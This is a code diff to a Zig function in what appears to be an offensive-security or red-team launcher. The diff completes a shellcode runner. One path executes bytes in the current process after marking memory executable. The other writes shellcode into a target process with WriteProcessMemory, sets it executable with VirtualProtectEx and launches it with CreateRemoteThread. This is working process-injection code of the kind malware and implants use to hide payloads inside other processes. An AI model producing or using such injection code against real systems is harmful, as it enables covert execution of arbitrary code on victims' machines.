@@ -33,7 +33,7 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     defer freeShellcode(shellcode_bytes);
 
     if (dumpbin) {
-        // ...
+        // TODO: Implement.
     }
 
     // PID 0 is Windows idle process
@@ -47,11 +47,11 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
         if (w32.VirtualProtect(
             @constCast(shellcode_bytes.ptr),
             4096,
-            w32.PAGE_EXECUTE_READ, // TODO: Do we need PAGE_EXECUTE_READWRITE? Verify in the debugger.
+            w32.PAGE_EXECUTE_READ,
             &old_protection,
         ) == w32.FALSE) return 0xff;
 
-        _ = w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096);
+        if (w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096) == w32.FALSE) return 0xff;
 
         @as(*const fn () callconv(.C) void, @ptrCast(shellcode_bytes.ptr))();
         return 0;
@@ -74,13 +74,31 @@ pub export fn go(arg_data: ?[*]u8, arg_len: i32) callconv(.C) u8 {
     defer _ = w32.VirtualFreeEx(process, addr, shellcode_bytes.len, w32.MEM_RELEASE);
 
     {
-        var num_bytes: w32.SIZE_T = 0;
-        const res = w32.WriteProcessMemory(process, addr, shellcode_bytes.ptr, shellcode_bytes.len, &num_bytes);
-        if (res == w32.FALSE or num_bytes != shellcode_bytes.len) return 0xff;
+        var num_bytes: w32.SIZE_T = undefined;
+        if (w32.WriteProcessMemory(
+            process,
+            addr,
+            shellcode_bytes.ptr,
+            shellcode_bytes.len,
+            &num_bytes,
+        ) == w32.FALSE) return 0xff;
+        if (num_bytes != shellcode_bytes.len) return 0xff;
+    }
+    {
+        var old_protection: w32.DWORD = undefined;
+        if (w32.VirtualProtectEx(
+            process,
+            addr,
+            4096,
+            w32.PAGE_EXECUTE_READ,
+            &old_protection,
+        ) == w32.FALSE) return 0xff;
+
+        if (w32.FlushInstructionCache(process, addr, 4096) == w32.FALSE) return 0xff;
     }
 
-    //const exit_code = bof_launcher.run(bof_bytes) catch return 0xff;
-    //return exit_code + 5;
+    const thread_handle = w32.CreateRemoteThread(process, null, 0, @ptrCast(addr), null, 0, null) orelse return 0xff;
+    defer _ = w32.CloseHandle(thread_handle);
 
     return 0;
 }
